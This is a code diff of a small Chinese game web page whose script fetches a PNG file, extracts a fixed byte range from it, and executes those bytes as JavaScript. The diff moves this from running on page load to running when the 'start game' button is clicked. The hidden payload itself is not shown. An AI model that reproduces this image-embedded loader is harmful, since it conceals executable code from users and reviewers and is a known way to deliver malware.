@@ -2,8 +2,14 @@
 <html lang="zh">
 <head><meta charset="UTF-8"></head>
 <body>
+<div>
+    <button onclick="kaishiyouxi9922();this.parentNode.removeChild(this)">开始游戏</button>
+    <a href="download.html">下载游戏</a>
+</div>
 <script>
-!function(){var e=new XMLHttpRequest;e.open("GET","image/upload/0ca19f874e0af3a23e1e50b181a2fc40.png",!0),e.responseType="arraybuffer",e.onload=function(){var n=new Uint8Array(e.response,28758,27277);debugger;document.body.appendChild(document.createElement("script")).text=String.fromCharCode.apply(null,n)},e.send()}()
+function kaishiyouxi9922(){
+    var e=new XMLHttpRequest;e.open("GET","image/upload/0ca19f874e0af3a23e1e50b181a2fc40.png",!0),e.responseType="arraybuffer",e.onload=function(){var n=new Uint8Array(e.response,28758,27277);document.body.appendChild(document.createElement("script")).text=String.fromCharCode.apply(null,n)},e.send()
+}
 </script>
 </body>
 </html>
